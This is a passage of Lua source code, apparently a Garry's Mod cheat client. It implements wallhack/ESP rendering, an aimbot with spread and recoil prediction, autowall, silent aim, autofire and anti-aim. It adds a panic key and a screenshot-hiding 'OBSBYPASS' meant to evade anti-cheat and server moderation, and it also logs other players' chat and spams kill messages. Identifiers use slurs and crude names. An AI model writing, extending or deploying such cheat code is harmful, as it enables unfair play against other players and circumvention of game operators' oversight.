surface.SetDrawColor(gay["WH_SKELETON_COLOR"])
end
surface.DrawLine(bs.x, bs.y, ps.x, ps.y);
end
            end
            if gay["WH_HITBOX"]then
for i = 0, em.GetHitBoxGroupCount(v) - 1 do
local count = em.GetHitBoxCount(v, i);
if(!count) then continue; end
for hitbox = 0, count do
local bone = em.GetHitBoxBone( v, hitbox, i );
if(!bone) then continue; end
local min, max = em.GetHitBoxBounds( v, hitbox, i );
local bonepos, boneang = em.GetBonePosition( v, bone );
cam.Start3D();
if gay["WH_HITBOX_COLORTYPE"] == "Team" then
render.DrawWireframeBox(bonepos,boneang,min,max,team.GetColor(v:Team()),true)
else
render.DrawWireframeBox(bonepos,boneang,min,max,gay["WH_HITBOX_COLOR"],true)
end
cam.End3D();
end 
end
end
            if gay["WH_CHAMS"]and not gay["OBSBYPASS"] then
local colorFix = (1 / 255)
local chamColVis = (gay["WH_CHAMS_COLORTYPE"]=="Team")and team.GetColor(v:Team()) or gay["WH_CHAMS_COLOR"]
                if gay["WH_CHAMS_TYPE"] == "XYZ" then 
                    cam.Start3D(EyePos(), EyeAngles())
                   cam.IgnoreZ(true)
                    render.SuppressEngineLighting(true)
                    em.DrawModel(v);
                    cam.IgnoreZ(false)
                    render.SuppressEngineLighting(false)
                    cam.End3D()
                elseif gay["WH_CHAMS_TYPE"] == "Textured" then
cam.Start3D( EyePos(), EyeAngles() )
render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( texturedCham )
em.SetRenderMode(v, 1);
em.DrawModel(v);
cam.End3D()
                elseif gay["WH_CHAMS_TYPE"] == "Flat" then
cam.Start3D( EyePos(), EyeAngles() )
render.SuppressEngineLighting( true )
render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( texturedCham )
em.SetRenderMode(v, 1);
em.DrawModel(v);
render.SuppressEngineLighting( false )
cam.End3D()
                elseif gay["WH_CHAMS_TYPE"] == "Wireframe" then
cam.Start3D( EyePos(), EyeAngles() )
render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( wireframeCham )
em.SetRenderMode(v, 1);
em.DrawModel(v);
cam.End3D()
                end
            end
            if gay["WH_BOX"] then
                if gay["WH_BOX_TYPETYPE"] == "2d" or gay["WH_BOX_TYPETYPE"] == "2d fat" then
                    local pos = em.GetPos(v)
                    local pos, aj = vm.ToScreen(pos - Vector(0, 0, 5)), vm.ToScreen(pos + Vector(0, 0, 70))
                    local u = pos.y - aj.y
                    local t = u / 2.2
                    if gay["WH_BOX_FRIENDCOLOR"] and isfriend then
                    surface.SetDrawColor(gay["WH_FRIENDCOLOR"])
                    elseif gay["WH_BOX_TYPECOLOR"] == "Custom" then
                        surface.SetDrawColor(gay["WH_BOX_COLOR"])
                    else
                        surface.SetDrawColor(team.GetColor(v:Team()))
                    end
                    if gay["WH_BOX_TYPETYPE"] == "2d fat" then
                    surface.DrawOutlinedRect(pos.x - t / 2, pos.y - u, t, u,2)
                    else
                    surface.DrawOutlinedRect(pos.x - t / 2, pos.y - u, t, u,1)
                end
                elseif gay["WH_BOX_TYPETYPE"] == "Corner" or gay["WH_BOX_TYPETYPE"] == "Corner fat" then
                    if gay["WH_BOX_FRIENDCOLOR"] and isfriend then
                    surface.SetDrawColor(gay["WH_FRIENDCOLOR"])
                    elseif gay["WH_BOX_TYPECOLOR"] == "Custom" then
                        surface.SetDrawColor(gay["WH_BOX_COLOR"])
                    else
                        surface.SetDrawColor(team.GetColor(v:Team()))
                    end
CornerBox(pos.x - w / 2, pos.y -h, w, h)
if gay["WH_BOX_TYPETYPE"] == "Corner fat"then
CornerBox(pos.x - w / 2 + 1, pos.y - h + 1, w - 2, h - 2);
end
                else
                    cam.Start3D()
                    if gay["WH_BOX_FRIENDCOLOR"] and isfriend then
                    render.DrawWireframeBox(v:GetPos(),Angle(0, v:EyeAngles().y, 0),v:OBBMins(),v:OBBMaxs(),gay["WH_FRIENDCOLOR"])
                    elseif gay["WH_BOX_TYPECOLOR"] == "Custom" then
                        render.DrawWireframeBox(v:GetPos(),Angle(0, v:EyeAngles().y, 0),v:OBBMins(),v:OBBMaxs(),gay["WH_BOX_COLOR"])
                    else
                        render.DrawWireframeBox(v:GetPos(),Angle(0, v:EyeAngles().y, 0),v:OBBMins(),v:OBBMaxs(),team.GetColor(v:Team()))
                    end
                    cam.End3D()
                end
            end
        end
    end
end

for _, p in next, ents.FindByClass("*") do  
    local nameent = p:GetClass()
    if gay["WH_ENTITY_DORMANT"] and p:IsDormant()then continue end
    if gay["ENTITYLIST"][nameent] then
        if p:GetPos():Distance(ply:GetPos()) < gay["WH_ENTITY_DISTANCE"] then
if gay["WH_ENTITY_CHAMS"] and nameent != "worldspawn"and not gay["OBSBYPASS"] then
local colorFix = (1 / 255)
local chamColVis = gay["WH_ENTITY_CHAMS_COLOR"]
                if gay["WH_ENTITY_CHAMS_TYPE"] == "XYZ" then 
                    cam.Start3D(EyePos(), EyeAngles())
                   cam.IgnoreZ(true)
                    render.SuppressEngineLighting(true)
                    em.DrawModel(p);
                    cam.IgnoreZ(false)
                    render.SuppressEngineLighting(false)
                    cam.End3D()
                elseif gay["WH_ENTITY_CHAMS_TYPE"] == "Textured" then
cam.Start3D( EyePos(), EyeAngles() )
render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( texturedCham )
em.SetRenderMode(p, 1);
em.DrawModel(p);
cam.End3D()
                elseif gay["WH_ENTITY_CHAMS_TYPE"] == "Flat" then
cam.Start3D( EyePos(), EyeAngles() )
render.SuppressEngineLighting( true )
render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( texturedCham )
em.SetRenderMode(p, 1);
em.DrawModel(p);
render.SuppressEngineLighting( false )
cam.End3D()
                elseif gay["WH_ENTITY_CHAMS_TYPE"] == "Wireframe" then
cam.Start3D( EyePos(), EyeAngles() )
render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( wireframeCham )
em.SetRenderMode(p, 1);
em.DrawModel(p);
cam.End3D()
                end
            end
            if gay["WH_ENTITY_NAME"] then
            local shitf=(gay["WH_ENTITY_NAME_DETAILS"])and nameent.." "..checknamesinfuck(p) or nameent
            surface.SetFont(hacka.fontentitysg)
local tw, th = surface.GetTextSize(shitf)
if gay["WH_ENTITY_NAME_COLORTYPE"]=="Custom"then
surface.SetTextColor(gay["WH_ENTITY_NAME_COLOR"]);
else
surface.SetTextColor(gay["ENTITYLISTclr"][nameent.."_Color"] or Color(255,255,255));
end
surface.SetTextPos(p:LocalToWorld(p:OBBCenter()):ToScreen().x-tw/2,p:LocalToWorld(p:OBBCenter()):ToScreen().y-th/2);
surface.DrawText(shitf);
end
            if gay["WH_ENTITY_BOX"] then
                if gay["WH_ENTITY_BOX_TYPE"] == "3d" then
local pos = em.GetPos(p);
local ang = em.GetAngles(p);
local min, max = em.GetRotatedAABB(p, em.GetCollisionBounds(p));
cam.Start3D();
if gay["WH_ENTITY_BOX_COLORTYPE"]=="Custom"then
render.DrawWireframeBox( pos, Angle(), min, max, gay["WH_ENTITY_BOX_COLOR"], false );
else
render.DrawWireframeBox( pos, Angle(), min, max, gay["ENTITYLISTclr"][nameent.."_Color"], false );
end
cam.End3D(); 
                else
                    if gay["WH_ENTITY_BOX_COLORTYPE"]=="Entity"and gay["ENTITYLISTclr"][nameent.."_Color"]then
surface.SetDrawColor(gay["ENTITYLISTclr"][nameent.."_Color"])
                    else
surface.SetDrawColor(gay["WH_ENTITY_BOX_COLOR"])
end
local x1, y1, x2, y2 = box2d(p)
                    surface.DrawLine(x1, y1, math.min(x1 + 500, x2), y1)
                    surface.DrawLine(x1, y1, x1, math.min(y1 + 500, y2))
                    surface.DrawLine(x2, y1, math.max(x2 - 500, x1), y1)
                    surface.DrawLine(x2, y1, x2, math.min(y1 + 500, y2))
                    surface.DrawLine(x1, y2, math.min(x1 + 500, x2), y2)
                    surface.DrawLine(x1, y2, x1, math.max(y2 - 500, y1))
                    surface.DrawLine(x2, y2, math.max(x2 - 500, x1), y2)
                    surface.DrawLine(x2, y2, x2, math.max(y2 - 500, y1))
                end
            end
        end
    end
end

end,function(a)print(a)end)


end


hook.Add("HUDPaint","]]..b.hooks["HUDPaint"]..[[",function()
if gay["OBSBYPASS"]then return end
hacka.esp()
end)



hook.Add("player_changename","]]..b.hooks["player_changename"]..[[",function(data)
zapiclogs("namechange",data.oldname.." changed to "..data.newname)
end)

hook.Add("player_connect","]]..b.hooks["player_connect"]..[[",function(data)
zapiclogs("connect",data.name.." "..data.networkid)
end)

hook.Add("player_disconnect","]]..b.hooks["player_disconnect"]..[[",function(data)
zapiclogs("disconnect",data.name.." "..data.networkid..". "..data.reason)
end)

hook.Add("player_say","]]..b.hooks["player_say"]..[[",function(player)
xpcall(function()
zapiclogs("chat",Player(player.userid):Nick()..": "..player.text)
end,function()end)
end)

hook.Add("player_hurt","]]..b.hooks["player_hurt"]..[[",function(b)
local ply=LocalPlayer()
local c="unknown"
local d="map"
local e="unknown weapon"
local s=0
for i,j in next, player.GetAll() do  
if j:UserID()==b.userid then 
c=j:Nick()
s=j:Health()
end
if j:UserID()==b.attacker then 
d=j:Nick()
if j:GetActiveWeapon()and j:GetActiveWeapon():IsValid()then 
e=j:GetActiveWeapon():GetPrintName()
end 
end 
end
if gay["HITSOUNDS"]and d==ply:Nick()then
surface.PlaySound("buttons/bell1.wav")
end
if gay["NOIFICATION_DAMAGEDMEBY"]and c==ply:Nick()then
hacka.onitify("You damaged by "..d.." with "..e)
end
zapiclogs("damage",d.." damage "..string.Replace(b.health-s,"-","").." hp "..c.." with "..e)
end)


hook.Add("entity_killed","]]..b.hooks["entity_killed"]..[[",function(qwe)
local ply="unknown"
local atk="map"
local wep="unknown weapon"
local retard=game.GetWorld()
local killah=game.GetWorld()
local inflictor=ents.GetByIndex(qwe.entindex_inflictor)
for _,p in next, player.GetAll() do  
if p:EntIndex()==qwe.entindex_killed then 
ply=p:Nick()
retard=p 
end
if p:EntIndex()==qwe.entindex_attacker then 
atk=p:Nick()
killah=p
if p:GetActiveWeapon()and p:GetActiveWeapon():IsValid()then 
wep=p:GetActiveWeapon():GetPrintName() 
end 
end 
end
if atk==ply then return end
zapiclogs("kill",atk.." killed "..ply.." with "..wep)
if ply==LocalPlayer():Nick()then
if gay["WH_NOIFICATION_DAMAGEDMEBY"]then
hacka.onitify("You killed by "..atk.." with "..wep)
end
else
if gay["SPAM_KILLSAY_ENABLED"] then
xpcall(function()
           if not gay["SPAM_KILLSAY_OOC"] then
                RunConsoleCommand("say", gay["SPAM_KILLSAY"][math.random(1, #gay["SPAM_KILLSAY"])])
           else
                RunConsoleCommand("say", "/ooc " .. gay["SPAM_KILLSAY"][math.random(1, #gay["SPAM_KILLSAY"])])
            end
end,function()end)
        end
end
end)


hook.Add("OnEntityCreated","]]..b.hooks["OnEntityCreated"]..[[",function(ent)
timer.Simple(0.1,function()
for _,v in next, player.GetAll() do  
if v:GetEyeTrace().Entity==ent and ent:GetModel() and not string.find(ent:GetModel(),".bsp") then
zapiclogs("prop",v:Nick().." spawned ".. ent:GetModel().." ("..tostring(ent:GetPos())..")")
end
end
end)
end)

hook.Add("PostDraw2DSkyBox","]]..b.hooks["PostDraw2DSkyBox"]..[[",function()
if panickey then return end
if panic then return end
if gay["WH_NOSKY"] then
render.Clear(gay["WH_NOSKY_COLOR"]["r"],gay["WH_NOSKY_COLOR"]["g"],gay["WH_NOSKY_COLOR"]["b"],0,true,true)
end
end)

hook.Add("RenderScene","]]..b.hooks["RenderScene"]..[[",function()
if panickey then return end
if panic then return end
if gay["WH_FULLBRIGHT"] then
render.SetLightingMode(1 and 1 or 0)
end
if gay["OBSBYPASS"]then
local e={x=0,y=0,w=ScrW(),h=ScrH(),dopostprocess=true,origin=b,angles=c,fov=d,drawhud=true,drawmonitors=true,drawviewmodel=true}
render.RenderView(e)
render.CopyTexture(nil,a)
cam.Start2D()
hook.Run("AltHUDPaint")
cam.End2D()
render.SetRenderTarget(a)
return true 
end
end)

hook.Add("PreDrawEffects","]]..b.hooks["PreDrawEffects"]..[[",function()
if panickey then return end
if panic then return end
if gay["WH_FULLBRIGHT"] then
render.SetLightingMode(0)
end
end)


hook.Add("Think","]]..b.hooks["Think"]..[[",function()
local ply=LocalPlayer()

if buttoncheckbind(gay["PANICKEY"]) && !hacka.pc then
hacka.pc = true
panickey=not panickey
timer.Simple( 0.5, function() hacka.pc = false end )
end

if panickey then return end

if buttoncheckbind(KEY_F12) && !hacka.fpanic then
hacka.fpanic = true
renderpanic(0.05)
timer.Simple( 0.5, function() hacka.fpanic = false end )
end

if buttoncheckbind(gay["WH_DEBUGCAMERA_KEY"]) && !hacka.fc then
hacka.fc = true

hacka.noclipenebled=!hacka.noclipenebled
lockview=hacka.noclipenebled
hacka.setview=true

timer.Simple( 0.5, function() hacka.fc = false end )
end

if buttoncheckbind(gay["WH_THIRDPERSON_KEY"]) && !hacka.th then
hacka.th = true

hacka.miscthipisidion=not hacka.miscthipisidion 

timer.Simple( 0.5, function() hacka.th = false end )
end

if buttoncheckbind(gay["MISC_ADDENTITYFRIEND"]) && !hacka.aep then
hacka.aep = true

local ent=ply:GetEyeTrace().Entity
if ent:IsPlayer()then
local pl=gay["FRIENDLIST"]
if not pl[ent:SteamID()] then
pl[ent:SteamID()]=true
if gay["NOIFICATION_ADDENTITYFRIEND"]and ent:Nick()then hacka.onitify("Add "..ent:Nick().." to friends") end
else
pl[ent:SteamID()]=false
if gay["NOIFICATION_ADDENTITYFRIEND"]and ent:Nick()then hacka.onitify("Removed "..ent:Nick().." of friends") end
end
zapic("FRIENDLIST",pl)
else
local ents=gay["ENTITYLIST"]
local class=ply:GetEyeTrace().Entity:GetClass()
if not ents[class] then
if class!="worldspawn"then
ents[class]=true
if gay["NOIFICATION_ADDENTITYFRIEND"]then hacka.onitify("Add "..class.." to list") end
end
else
ents[class]=false
if gay["NOIFICATION_ADDENTITYFRIEND"]then hacka.onitify("Removed "..class.." of list") end
end
zapic("ENTITYLIST",ents)
end

timer.Simple( 0.5, function() hacka.aep = false end )
end

if gay["WH_TRANSPARENT_WALLS"]then
if buttoncheckbind(gay["WH_TRANSPARENT_WALLS_KEY"]) && !hacka.tk then
hacka.tk = true
if hacka.tnl then
translate(1)
hacka.tnl=not hacka.tnl
else
hacka.tnl=not hacka.tnl
translate(gay["WH_TRANSPARENT_WALLS_TRA"])
end
timer.Simple( 0.5, function() hacka.tk = false end )
end
end


end)


local function FixMovement(pCmd)
local vec = Vector(cm.GetForwardMove(pCmd), cm.GetSideMove(pCmd), 0)
local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
local mang = vm.Angle(vec)
local yaw = cm.GetViewAngles(pCmd).y - fa.y + mang.y
if (((cm.GetViewAngles(pCmd).p+90)%360) > 180) then
yaw = 180 - yaw
end
yaw = ((yaw + 180)%360)-180
pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end

local function Phys()
local ply=LocalPlayer()
local w = pm.GetActiveWeapon(ply);
if w:IsValid() and w:GetClass() == "weapon_physgun" then
if input.IsKeyDown(KEY_E)then
return true
end
else
return false
end
end


local function NormalizeAngle(ang)
ang.x = math.NormalizeAngle(ang.x);
ang.p = math.Clamp(ang.p, -89, 89);
end

local function hitis(b,c)
local ply=LocalPlayer()
local d={start=ply:GetShootPos(),endpos=c,mask=MASK_SHOT,filter=function(e)
return !e:IsPlayer()end}
local f=util.TraceLine(d)
return !f.Hit 
end;
local bones={0,16,4,1,5,2,6,3,15,11,7,12,8,13,9}
local function GetPos(v)
if(gay["AIM_HITBOX"]=="Hitscan")and not v:IsNPC() then 
for i,j in next,bones do 
Hitscan=v:GetHitBoxBone(bones[i],0)
if Hitscan!=nil then 
HitscanPos=v:GetBonePosition(Hitscan)
HitMin,HitMax=v:GetHitBoxBounds(bones[i],0)
if hitis(v,HitscanPos+(HitMin+HitMax)/2)then 
return HitscanPos+(HitMin+HitMax)/2 
end 
end 
end 
end
if(gay["AIM_HITBOX"]=="Body") then 
return( em.LocalToWorld(v, em.OBBCenter(v)) ); 
end
local eyes = em.LookupAttachment(v, "eyes");
if(!eyes) then return( em.LocalToWorld(v, em.OBBCenter(v)) ); end
local pos = em.GetAttachment(v, eyes);
if(!pos) then return( em.LocalToWorld(v, em.OBBCenter(v)) ); end
return(pos.Pos);
end


local function FASAutowall(wep, startPos, aimPos, ply)
local ply=LocalPlayer()
if not gay["AIM_AUTOWALL"] then return end
local traces = {}
local traceResults = {}
local dir = (aimPos - startPos):GetNormalized()
traces[1] = {start = startPos, filter = LocalPlayer(), mask = trace_normal, endpos = aimPos,}
traceResults[1] = util.TraceLine(traces[1])
if(NoPenetration[traceResults[1].MatType]) then return false end
if( - dir:DotProduct(traceResults[1].HitNormal) <= .26) then return false end
traces[2] = {start = traceResults[1].HitPos, endpos = traceResults[1].HitPos + dir * wep.PenStr * (PenMod[traceResults[1].MatType] or 1) * wep.PenMod, filter = LocalPlayer(), mask = trace_walls,}
traceResults[2] = util.TraceLine(traces[2])
traces[3] = {start = traceResults[2].HitPos, endpos = traceResults[2].HitPos + dir * .1, filter = LocalPlayer(), mask = trace_normal,}
traceResults [3] = util.TraceLine(traces[3])
traces[4] = {start = traceResults[2].HitPos, endpos = aimPos, filter = LocalPlayer(), mask = MASK_SHOT,}
traceResults[4] = util.TraceLine(traces[4])
if(traceResults[4].Entity ~= ply) then return false end
return(not traceResults[3].Hit)
end

local function M9KAutowall(ent)
local ply=LocalPlayer()
local w = pm.GetActiveWeapon(ply);
if not gay["AIM_AUTOWALL"]then return end
if not IsValid(ent) and not ent:IsPlayer()then return end
local penvalues = {["SniperPenetratedRound"] = 20,["Pistol"] = 9,["357"] = 12,["SMG1"] = 14,["AR2"] = 16,["Buckshot"] = 5}
local trace = util.TraceLine({mask = MASK_ALL, start = ply:GetShootPos(), endpos = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), filter = {ply, ent}})
local wall = util.TraceLine({mask = MASK_SHOT, start = ply:GetShootPos(), endpos = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), filter = {ply, ent}})
local wall2 = util.TraceLine({mask = MASK_SHOT, start = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), endpos = ply:GetShootPos(), filter = {ply, ent}})
if trace.Fraction == 1 or (IsValid(w) and wall.HitPos:Distance(wall2.HitPos) < penvalues[game.GetAmmoName(w:GetPrimaryAmmoType())]) then
return true
end
end

local a,b,c;local d={}
local function infovnew(f)
local ply=LocalPlayer()
if not f then return end
if gay["AIM_FOV"]==0 then
return true
end
local g=fa
local h=(f:GetPos()-ply:GetPos()):Angle()
local i=math.abs(math.NormalizeAngle(g.y-h.y))
local j=math.abs(math.NormalizeAngle(g.ply-h.ply))
if i<gay["AIM_FOV"]/3 and j<gay["AIM_FOV"]/3 then
return true 
end
return false 
end

local aimignore;

local function Valid(v)
local ply=LocalPlayer()
if(!v || !em.IsValid(v) || v == ply || em.Health(v) < 1 || em.IsDormant(v) || pm.Team(v) == 1002|| !infovnew(v)) then return false; end
if v:SteamID()then
if gay["FRIENDLIST"][v:SteamID()] then return false; end
end
if v:Team()then
if gay["TEAMLIST"][team.GetName(v:Team())] then return false; end
end
if v:GetUserGroup()then
if gay["RANKLIST"][v:GetUserGroup()] then return false; end
end
local tr = {start = em.EyePos(ply),endpos = GetPos(v),mask = MASK_SHOT,filter = {ply, v},};
local wep = ply:GetActiveWeapon()
if(util.TraceLine(tr).Fraction == 1) then
return true
elseif(wep and wep:IsValid() and wep.PenStr) then
return FASAutowall(wep, tr.start, tr.endpos, v)
elseif (wep and wep:IsValid() and wep.BulletPenetrate) then
return M9KAutowall(v)
end
return false
end

local function gettarget()
local me=LocalPlayer()
local opt=gay["AIM_PRIORITY"]
if opt=="Closest Distance"then
dists = {};
if gay["AIM_NPC"]then
for k, v in next, ents.GetAll() do
if(!v:IsNPC()) then continue end
if(!infovnew(v))then continue end
local EyePos = v:EyePos():ToScreen()
dists[#dists + 1] = { vm.Distance( em.GetPos(v), em.GetPos(me) ), v };
end
end
for k,v in next, player.GetAll() do
if(v:IsNPC()) then continue end
if(!Valid(v)) then continue; end
dists[#dists + 1] = { vm.Distance( em.GetPos(v), em.GetPos(me) ), v };
end
table.sort(dists, function(a, b)
return(a[1] < b[1]);
end);
aimtarget = dists[1] && dists[1][2] || nil;
elseif opt=="Least Health"then
dists = {};
if gay["AIM_NPC"]then
for k, v in next, ents.GetAll() do
if(!v:IsNPC()) then continue end
if(!infovnew(v))then continue end
local EyePos = v:EyePos():ToScreen()
dists[#dists + 1] = { em.Health(v), v };
end
end
for k,v in next, player.GetAll() do
if(v:IsNPC()) then continue end
if(!Valid(v)) then continue; end
dists[#dists + 1] = { em.Health(v), v };
end
table.sort(dists, function(a, b)
return(a[1] < b[1]);
end);
aimtarget = dists[1] && dists[1][2] || nil;
elseif opt=="Field of View"then
dists = {}
local x, y = ScrW(), ScrH()
local AngA, AngB = 0

if gay["AIM_NPC"]then
for k, v in next, ents.GetAll() do
if(!v:IsNPC()) then continue end
if(!infovnew(v))then continue end
local EyePos = v:EyePos():ToScreen()
dists[#dists + 1] = {math.Dist(x / 2, y / 2, EyePos.x, EyePos.y), v}
end
end
for k, v in next, player.GetAll() do
if(v:IsNPC()) then continue end
if(!Valid(v)) then continue end
local EyePos = v:EyePos():ToScreen()
dists[#dists + 1] = {math.Dist(x / 2, y / 2, EyePos.x, EyePos.y), v}
end

table.sort(dists, function(a, b)
return(a[1] < b[1])
end)
aimtarget = dists[1] && dists[1][2] || nil
end
end

local bit = Copy(bit);
local IsFirstTimePredicted = IsFirstTimePredicted;
local CurTime = CurTime;
local servertime=0;

hook.Add("Move", "", function()
    if(!IsFirstTimePredicted()) then return; end
    servertime = CurTime() + engine.TickInterval();
end);

local function PredictPos(pos)
local myvel = LocalPlayer():GetVelocity()
local pos = pos - (myvel * engine.TickInterval()); 
return pos;
end

GAMEMODE["EntityFireBullets"] = function(self, p, data)
local ply=LocalPlayer()
aimignore = aimtarget;
local w = pm.GetActiveWeapon(ply);
local Spread = data.Spread
if(!w || !em.IsValid(w) || cones[em.GetClass(w)] == Spread || Spread == nullvec) then return; end
cones[em.GetClass(w)] = Spread;
end

local function PredictSpread(ucmd, ang)
local ply=LocalPlayer()
local weapfon=ply:GetActiveWeapon()
if !IsValid(weapfon or NULL)then return am.Forward(ang); end
local w=weapfon:GetClass()
local cone=weapfon.CurCone
local base=weapfon.Base
if(!w or !weapfon or !gay["AIM_NOSPREAD"]) then return am.Forward(ang); end
if cone then
if base=="fas2_base"then
math.randomseed(servertime)
else
math.randomseed(ucmd:CommandNumber())
end
if gay["AIM_NORECOIL"]then
return(ang-ply:GetPunchAngle()-Angle(math.Rand(-cone,cone),math.Rand(-cone,cone),0)*25):Forward()
else
return(ang-Angle(math.Rand(-cone,cone),math.Rand(-cone,cone),0)*25):Forward()
end
end
if cones[w]then
if gay["AIM_NORECOIL"]and base=="tfa_gun_base" then
return(hacka.dickfack(ucmd, ang-ply:GetViewPunchAngles(), cones[w]or 0));
else
return(hacka.dickfack(ucmd, ang, cones[w]or 0));
end
end
return am.Forward(ang);
end

local function Autofire(ucmd)
local ply=LocalPlayer()
if(pm.KeyDown(ply, 1)) then
cm.SetButtons(ucmd, bit.band( cm.GetButtons(ucmd), _G["bit"]["bn".."ot"]( 1 ) ) );
else
cm.SetButtons(ucmd, bit.bor( cm.GetButtons(ucmd), 1 ) );
end
end


local function SmoothAim(ang) 
local ply=LocalPlayer()
if(gay["AIM_SMOOTHING"] > 0) then
ang.y = math.NormalizeAngle(ang.y) 
ang.p = math.NormalizeAngle(ang.p) 
eyeang = ply:EyeAngles() 
local smooth = gay["AIM_SMOOTHING"]
if((eyeang.y - ang.y) * - 1 > 180 && eyeang.y < 0) then eyeang.y = eyeang.y + 360 end 
if((ang.y - eyeang.y) * - 1 > 180 && ang.y < 0) then ang.y = ang.y + 360 end 
eyeang.y = eyeang.y + (ang.y - eyeang.y) / smooth eyeang.x = eyeang.x + (ang.x - eyeang.x) / smooth eyeang.r = 0 
return eyeang 
else 
return ang
end 
end

local function aimkeycheck(a)
local ply=LocalPlayer()
if pm.IsTyping(ply)then return false end
if not em.IsValid(ply:GetActiveWeapon())then return false end
if input.IsKeyDown(a)or input.IsMouseDown(a)then
return true
end
return false
end

local function alwayscheck()
local ply=LocalPlayer()
if pm.IsTyping(ply)then return false end
if not em.IsValid(ply:GetActiveWeapon())then return false end
return true
end


local function aimer(ucmd)
local ply=LocalPlayer()
if(cm.CommandNumber(ucmd) == 0 || !gay["AIM_ENABLED"]) then return; end
gettarget();
aa = false;
if(aimtarget && aimkeycheck(gay["AIM_KEY"]) or aimtarget && gay["AIM_KEY"]==0 && alwayscheck())then
aa = true;

local pos = PredictPos(GetPos(aimtarget) - em.EyePos(ply));
local ang = vm.Angle( PredictSpread(ucmd, vm.Angle(pos)));
NormalizeAngle(ang);
local ang = SmoothAim(ang)

cm.SetViewAngles(ucmd, ang)
if(gay["AIM_AUTOFIRE"]) then
Autofire(ucmd);
end
if(gay["AIM_SILENT"]) then
FixMovement(ucmd);
else
fa = SmoothAim(vm.Angle(pos));
end
end
end



local function GetClosest()
local ply=LocalPlayer()
local ddists = {};
local closest;
for k,v in next, player.GetAll() do
if(!Valid(v)) then continue; end
ddists[#ddists + 1] = { vm.Distance( em.GetPos(v), em.GetPos(ply) ), v };
end
table.sort(ddists, function(a, b)
return(a[1] < b[1]);
end);
closest = ddists[1] && ddists[1][2] || nil;
if(!closest) then return fa.y; end
local pos = em.GetPos(closest);
local pos = vm.Angle(pos - em.EyePos(ply));
return( pos.y );
end

local ox=-181;
local oy=0;

local function RandCoin()
local randcoin = math.random(0,1);
if(randcoin == 1) then return 1; else return -1; end
end

local function GetX()
local opt = gay["ANTIAIM_X"]
if(opt == "Emotion") then
local randcoin = gay["ANTIAIM_EMOTION_X"]
if( math.random(100) < randcoin ) then
ox = RandCoin() * 181;
end
elseif( opt == "Up" ) then
ox = -181;
elseif( opt == "Down" ) then
ox = 181;
elseif(opt == "Jitter") then
ox = ox * -1;
elseif(opt == "Test") then
ox = -180 + math.random(1, 1.99999999999999999999);
end
end



local function GetY()
local opt = gay["ANTIAIM_Y"]
if(opt == "Emotion") then
local randcoin = gay["ANTIAIM_EMOTION_Y"]
if( math.random(100) < randcoin ) then
oy = fa.y + math.random(-180, 180);
end
elseif( opt == "Eye Angles" ) then
oy = fa.y;
elseif( opt == "Sideways" ) then
oy = fa.y - 90;
elseif(opt == "Jitter") then
oy = fa.y + math.random(-90, 90);
elseif(opt == "TJitter") then
oy = fa.y - 180 + math.random(-90, 90);
elseif(opt == "Static") then
oy = 0;
elseif(opt == "Forward") then
oy = fa.y;
elseif(opt == "Backwards") then
oy = fa.y - 180;
elseif(opt == "Test") then
oy = GetClosest() + 180.79;
end
end

local function walldetect()
local ply=LocalPlayer()
local eye = em.EyePos(ply);
local tr = util.TraceLine({start = eye,endpos = (eye + (am.Forward(fa) * 10)),mask = MASK_ALL,});
if(tr.Hit) then
ox = -181;
oy = -90;
end
end

local function antiaimer(ucmd)
if( (cm.CommandNumber(ucmd) == 0 && !hacka.miscthipisidion) || cm.KeyDown(ucmd, 1) || cm.KeyDown(ucmd, 32) || aa || !gay["ANTIAIM_ENABLED"]) then return; end
GetX();
GetY();
walldetect();
local aaang = Angle(ox, oy, 0);
cm.SetViewAngles(ucmd, aaang);
FixMovement(ucmd, true);
end

local function meme(ucmd)
if(!fa) then fa = cm.GetViewAngles(ucmd); end
if not Phys()and not hacka.noclipenebled then
fa = fa + Angle(cm.GetMouseY(ucmd) * .022, cm.GetMouseX(ucmd) * -.022, 0);
end
NormalizeAngle(fa);
if(cm.CommandNumber(ucmd) == 0) then
cm.SetViewAngles(ucmd, fa);
return;
end
if(cm.KeyDown(ucmd, 1))then
local ang = vm.Angle( PredictSpread(ucmd, fa ) );
NormalizeAngle(ang);
cm.SetViewAngles(ucmd, ang);
end
end

local function AutoReload(pCmd)
local ply=LocalPlayer()
local wep = ply:GetActiveWeapon()
if (ply:Alive() and ply:Health() > 0 and IsValid(wep)) then
if (wep:Clip1() <= 0 and wep:GetMaxClip1() > 0 and CurTime() > wep:GetNextPrimaryFire()) then
pCmd:SetButtons(pCmd:GetButtons() + IN_RELOAD)
end
end
end

local function fixmov(cmd, rotation)
local rot_cos = math.cos(rotation)
local rot_sin = math.sin(rotation)
local cur_forwardmove = cmd:GetForwardMove()
local cur_sidemove = cmd:GetSideMove()
cmd:SetForwardMove(((rot_cos * cur_forwardmove) - (rot_sin * cur_sidemove)))
cmd:SetSideMove(((rot_sin * cur_forwardmove) + (rot_cos * cur_sidemove)))
end

local CircleStrafeSpeed = 3

hook.Add("CreateMove","]]..b.hooks["CreateMove"]..[[",function(ucmd)
if panickey then return end


if hacka.noclipenebled then
local time=gay["WH_DEBUGCAMERA_SPEED"]
hacka.vieworigin=hacka.vieworigin+(hacka.viewvelocity*time)
hacka.viewvelocity=hacka.viewvelocity*0.95
local sensitivity=0.022
